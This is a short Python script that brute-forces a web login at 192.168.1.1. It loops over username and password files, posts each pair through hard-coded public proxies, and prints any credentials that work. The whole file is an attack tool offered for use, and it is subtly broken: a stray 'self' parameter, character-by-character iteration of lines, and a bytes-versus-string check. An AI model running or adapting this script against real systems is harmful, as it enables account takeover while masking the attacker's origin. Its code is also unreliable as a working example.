# -*- coding: utf-8 -*-
# @Time    : 2018-12-31 21:34
# @Author  : Light4ce
# @Email   : dark4ce@163.com
# @File    : brute_login.py

import requests

username = open('username.txt','r')
passwd = open('password.txt','r')

def tryBrute(self, name, pwd):
	body = {
		"username":name,
		"password":pwd
	}
	headers = {
		'content-type': "application/json",
		'Authorization': 'APP appid = 4abf1a,token = 9480295ab2e2eddb8'}
	proxy = {
		'http': '120.25.253.234:812',
		'https': '163.125.222.244:8123'
	}
	url = "http://192.168.1.1/login"
	r = requests.post(url=url, data=body, headers=headers, proxies=proxy)
	isFind = False
	if "failed" in r.content:  # 这里是对应网站的密码验证逻辑
		print('尝试密码', pwd, '登陆失败')
		isFind = False
	else:
		print (name, '登陆成功', 'password = ', pwd)
		isFind = True
	return isFind



if __name__ == '__main__':
	for user in username.readline():
		for pwd in passwd.readline():
			if tryBrute(user, pwd):
				break;